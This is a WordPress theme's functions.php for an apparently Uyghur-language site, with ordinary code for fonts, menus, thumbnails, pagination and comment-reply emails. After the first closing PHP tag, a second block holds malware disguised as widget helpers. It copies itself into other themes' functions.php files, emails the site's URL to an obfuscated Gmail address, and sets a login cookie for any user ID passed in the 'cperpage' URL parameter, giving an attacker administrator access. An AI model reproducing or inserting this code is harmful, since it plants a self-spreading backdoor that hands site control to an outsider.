<?php
include(TEMPLATEPATH."/includes/theme_options.php");

/**
 * 打印最新评论列表
 * @param args		参数字符串
 */
function wp_recentcomments( $args = '' ) {
	echo create_recentcomments( $args );
}

/**
 * 打印最新评论列表 (兼容老版本的方法, 不推荐使用)
 * @param args		参数字符串
 */
function get_recentcomments( $args ) {
	echo wp_recentcomments( $args );
}


//uyghur font sitart
add_action('admin_head', 'arqabet_uslub');
function arqabet_uslub() {
  echo '<style>
    body, td, textarea, input, select,p,div,ul,li,ol,h2,h3,h1,h4,h6,a,b{
      font-family: "Alp Ekran" !important;
      font-size: 15px;
    } 
.ab-label{
      font-family: "Alp Ekran" !important;
      font-size: 15px;
    } 
  </style>
<script type="text/javascript">
setTimeout(function(){
document.getElementById("content_ifr").contentDocument.getElementById("tinymce").style.fontFamily="Alp Ekran";
document.getElementById("content_ifr").contentDocument.getElementById("tinymce").style.fontSize="15px";
}, 2000);
</script>';
}
//uyghur font end!
add_theme_support( 'post-thumbnails' ); 
if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );	
}


if ( function_exists('register_nav_menus') ) {
	register_nav_menus(
  array(
	'top-menu' => __( 'ئاساسىي تىزىملىك' ),
  )
);
}


//菜单回调函数
function menzil_nav_fallback(){
  echo '<div class="menu-alert">请在 “后台 - 外观 -菜单” 设置导航菜单.</div>';
}
add_filter('mce_buttons_3', 'enable_more_buttons');
add_filter('show_admin_bar', '__return_false');

//添加小工具
if ( function_exists('register_sidebar') )
    register_sidebar();	

/*
if( function_exists( 'register_sidebar_widget' ) ) {   
   
    register_sidebar_widget('رەسىم/فىلىم','mb_categories');   
}   
function mb_categories() { include(TEMPLATEPATH . '/includes/categories.php'); }  

*/
/**
 * Register three Twenty Fourteen widget areas.
 *
 * @since Twenty Fourteen 1.0
 *
 * @return void
 */

function twentyfourteen_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Content Sidebar', 'twentyfourteen' ),
		'id'            => 'sidebar1',
		'description'   => __( 'Additional sidebar that appears on the right.', 'twentyfourteen' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4><ul id="categories">',
	) );
	
}
add_action( 'widgets_init', 'twentyfourteen_widgets_init' );

//添加形式
/*
	add_theme_support( 'post-formats', array( 
		'aside', 'status','video','audio','gallery','link','chat','image','quote' ) );
*/


// gavatar
function get_ssl_avatar($avatar) {
   $avatar = preg_replace('/.*\/avatar\/(.*)\?s=([\d]+)&.*/','<img src="https://secure.gravatar.com/avatar/$1?s=$2" class="avatar avatar-$2" height="$2" width="$2">',$avatar);
   return $avatar;
}
add_filter('get_avatar', 'get_ssl_avatar');


//添加小工具


//添加特色图像
if ( function_exists( 'add_theme_support' ) ) {
	add_theme_support( 'post-thumbnails' );
}

//图片获取
function post_thumbnail_src($width = 100,$height = 80){
      global $post;
  if( has_post_thumbnail() ){    //如果有特色缩略图，则输出缩略图地址
    $thumbnail_src = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),'full');
    $post_thumbnail_src = $thumbnail_src [0];
  } else {
    $post_thumbnail_src = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    $post_thumbnail_src = $matches [1] [0];   //获取该图片 src
    if(empty($post_thumbnail_src)){ //如果日志中没有图片，则显示随机图片
      $random = mt_rand(1, 30);
      $post_thumbnail_src = get_bloginfo('template_url').'/images/icons/'.$random;
      //如果日志中没有图片，则显示默认图片
      //$post_thumbnail_src = get_bloginfo('template_url'). '/images/menzil.png';
    }
  };
  //echo get_bloginfo("template_url").'/timthumb.php?src='.$post_thumbnail_src.'&amp;h='.$height.'&amp;w='.$width.'&amp;zc=1';
   echo $post_thumbnail_src;
}

//图片获取
function post_icons_src($width = 48,$height = 48){
     global $post;
    $post_icons_src = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    $post_icons_src = $matches [1] [0];   //获取该图片 src
    //如果日志中没有图片，则显示随机图片
      $random = mt_rand(1, 30);
      $post_icons_src = get_bloginfo('template_url').'/images/icons/'.$random;
      //如果日志中没有图片，则显示默认图片
      //$post_icons_src = get_bloginfo('template_url'). '/images/menzil.png';
    
  
  //echo get_bloginfo("template_url").'/timthumb.php?src='.$post_icons_src.'&amp;h='.$height.'&amp;w='.$width.'&amp;zc=1';
   echo $post_icons_src;
}



//标签彩背景色显示代码开始
function colorCloud($text)
{
    $text = preg_replace_callback('|<a (.+?)>|i', 'colorCloudCallback', $text);
    return $text;
}
function colorCloudCallback($matches)
{
    $colors = array('0664B0', '2F9944', 'F53300', 'CA5254', 'FF8000', 'F09', '8484FF', 'B7B700');
    shuffle($colors);
    $color = $colors[rand(0, 7)];
    $text = $matches[1];
    $pattern = '/style=(\'|\\")(.*)(\'|\\")/i';
    $text = preg_replace($pattern, "style=\"background-color: #{$color};\"", $text);
    return "<a {$text}>";
}
add_filter('wp_tag_cloud', 'colorCloud', 1);



function register_mysettings() {
register_setting( 'wpyou-settings','wpyou_cnsite_url');
register_setting( 'wpyou-settings','wpyou_ensite_url');
}



//获取文章的阅读次数
function post_views($before = '(كۆرۈلىشى ', $after = ' قىتىم )', $echo = 1){
global $post;
$post_ID = $post->ID;
$views = (int)get_post_meta($post_ID,'views', true);
if ($echo) echo $before, number_format($views), $after;
else return $views; }



//浏览次数
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.'';
}

function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
/*加载所需要的PHP文件*/
if ( STYLESHEETPATH == TEMPLATEPATH ) {
	define('OF_FILEPATH', TEMPLATEPATH);
	define('OF_DIRECTORY', get_bloginfo('template_directory'));
} else {
	define('OF_FILEPATH', STYLESHEETPATH);
	define('OF_DIRECTORY', get_bloginfo('stylesheet_directory'));
}
//标题文字截断
function cut_str($src_str,$cut_length)
{
    $return_str='';
    $i=0;
    $n=0;
    $str_length=strlen($src_str);
    while (($n<$cut_length) && ($i<=$str_length))
    {
        $tmp_str=substr($src_str,$i,1);
        $ascnum=ord($tmp_str);
        if ($ascnum>=224)
        {
            $return_str=$return_str.substr($src_str,$i,3);
            $i=$i+3;
            $n=$n+2;
        }
        elseif ($ascnum>=192)
        {
            $return_str=$return_str.substr($src_str,$i,2);
            $i=$i+2;
            $n=$n+2;
        }
        elseif ($ascnum>=65 && $ascnum<=90)
        {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+2;
        }
        else 
        {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+1;
        }
    }
    if ($i<$str_length)
    {
        $return_str = $return_str . '...';
    }
    if (get_post_status() == 'private')
    {
        $return_str = $return_str . '（private）';
    }
    return $return_str;
}

//评论回复...
function comment_mail_notify($comment_id) {
    $admin_email = get_bloginfo ('admin_email'); 
    $comment = get_comment($comment_id);
    $comment_author_email = trim($comment->comment_author_email);
    $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
    $to = $parent_id ? trim(get_comment($parent_id)->comment_author_email) : '';
    $spam_confirmed = $comment->comment_approved;
    if (($parent_id != '') && ($spam_confirmed != 'spam') && ($to != $admin_email)) {
    $wp_email = 'admin@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']));
    $subject = 'سىزنىڭ [' . get_option("blogname") . '] دىكى ئىنكاسىڭىزغا جاۋاب قايتۇرۇلدى!';
    $message = '
	<style>
	@font-face{font-family:UKIJ Tuz Tom;src:url('.get_bloginfo('template_url').'/UKIJTuT.eot);src:url('.get_bloginfo('template_url').'/UKIJTuT.eot?#iefix) format(embedded-opentype),url('.get_bloginfo('template_url').'/UKIJTuT.woff) format(woff),url('.get_bloginfo('template_url').'/UKIJTuT.ttf) format(truetype),url('.get_bloginfo('template_url').'/UKIJTuT.svg#UKIJTuzTomRegular) format(svg);font-weight:normal;font-style:normal}
	</style>
    <div style="background-color:#fff; border:1px solid #666666; color:#111; -moz-border-radius:8px; -webkit-border-radius:8px; -khtml-border-radius:8px; border-radius:8px; font-size:12px; width:702px; margin:0 auto; margin-top:10px;">
    <div style=" direction:rtl;background:#666666; width:100%; height:60px; color:white; -moz-border-radius:6px 6px 0 0; -webkit-border-radius:6px 6px 0 0; -khtml-border-radius:6px 6px 0 0; border-radius:6px 6px 0 0; ">
    <span style="height:60px; line-height:60px; margin-right:30px; font-size:20px;font-family:UKIJ Tuz Tom,Alpida Unicode System,Microsoft Uighur,Tahoma,Arial,Helvetica,sans-serif;"> سىزنىڭ<a style="text-decoration:none; color:#ff0;font-weight:600;"> [' . get_option("blogname") . '] </a> دىكى ئىنكاسىڭىزغا جاۋاب قايتۇرۇلدى!</span></div>
    <div style=" direction:rtl;width:90%; margin:0 auto; font-family:UKIJ Tuz Tom,Alpida Unicode System,Microsoft Uighur,Tahoma,Arial,Helvetica,sans-serif; font-size:17px">
      <p> ئەسسالامۇ ئەلەيكۇم، ' . trim(get_comment($parent_id)->comment_author) . '!</p>
      <p>سىزنىڭ «' . get_the_title($comment->comment_post_ID) . '» دېگەن كىتابدىكى ئىنكاسىڭىز:<br />
      <p style="background-color: #EEE;border: 1px solid #DDD;padding: 20px;margin: 15px 0;">'. trim(get_comment($parent_id)->comment_content) . '</p>
      <p>' . trim($comment->comment_author) . ' نىڭ سىزگە قايتۇرغان جاۋابى:<br />
      <p style="background-color: #EEE;border: 1px solid #DDD;padding: 20px;margin: 15px 0;">'. trim($comment->comment_content) . '</p>
      <p>تولۇق مەزمۇنىنى كۆرمەكچى بولسىڭىز <a href="' . htmlspecialchars(get_comment_link($parent_id, array('type' => 'comment'))) . '">بۇ يەردىن كىرىپ كۆرۈڭ.</a></p>
      <p>سىزنىڭ بىكىتىمىزگە دائىم كېلىپ تۇرىشىڭىزنى قارشى ئالىمىز! ئادرىسىمىز: <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
      <p>(ئىلخەت ئاپتوماتىك ئەۋەتىلدى، جاۋاب قايتۇرماڭ.)</p>
    </div></div>';
    $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
    $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
    wp_mail( $to, $subject, $message, $headers );
    }
  }
  add_action('comment_post', 'comment_mail_notify');


//分页函数
function pagenavi($p = 2)
{
    if (is_singular()) {
        return;
    }
    global $wp_query, $paged;
    $max_page = $wp_query->max_num_pages;
    if ($max_page == 1) {
        return;
    }
    if (empty($paged)) {
        $paged = 1;
    }
    echo ((('<span class="page-numbers">' . $max_page) . ' / ') . $paged) . ' </span> ';
    if ($paged > 1) {
        p_link($paged - 1, 'ئالدىنقى بەت', 'ئالدىنقى بەت');
    }
    if ($paged > $p + 1) {
        p_link(1, 'بىرىنجى بەت');
    }
    if ($paged > $p + 2) {
        echo '<span class="page-numbers">...</span>';
    }
    for ($i = $paged - $p; $i <= $paged + $p; $i++) {
        if ($i > 0 && $i <= $max_page) {
            $i == $paged ? print "<span class='page-numbers current'>{$i}</span> " :  p_link($i);
        }
    }
    if ($paged < ($max_page - $p) - 1) {
        echo '<span class="page-numbers">...</span>';
    }
    if ($paged < $max_page - $p) {
        p_link($max_page, 'ئاخىرقى بەت');
    }
    if ($paged < $max_page) {
        p_link($paged + 1, 'كېيىنكى بەت', 'كېيىنكى بەت');
    }
}
function p_link($i, $title = '', $linktype = '')
{
    if ($title == '') {
        $title = " {$i} - بەت";
    }
    if ($linktype == '') {
        $linktext = $i;
    } else {
        $linktext = $linktype;
    }
    echo '<a class=\'page-numbers\' href=\'', esc_html(get_pagenum_link($i)), "' title='{$title}'>{$linktext}</a> ";
}
//增强编辑器开始
function add_editor_buttons($buttons) {
$buttons[] = 'fontselect';
$buttons[] = 'fontsizeselect';
$buttons[] = 'cleanup';
$buttons[] = 'styleselect';
$buttons[] = 'hr';
$buttons[] = 'del';
$buttons[] = 'sub';
$buttons[] = 'sup';
$buttons[] = 'copy';
$buttons[] = 'paste';
$buttons[] = 'wp_more';
$buttons[] = 'undo';
$buttons[] = 'image';
$buttons[] = 'forecolor';
$buttons[] = 'backcolor';
$buttons[] = 'wp_page';
$buttons[] = 'charmap';
$buttons[] = 'wp_more';
return $buttons;
}
add_filter("mce_buttons_3", "add_editor_buttons");
//增强编辑器结束

			
//登陆显示头像
function weisay_get_avatar($email, $size = 48){
return get_avatar($email, $size);
}

//All End! 2015-10-10 21:48:40
?>
<?php
function _check_isactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_isactive_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mes".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>
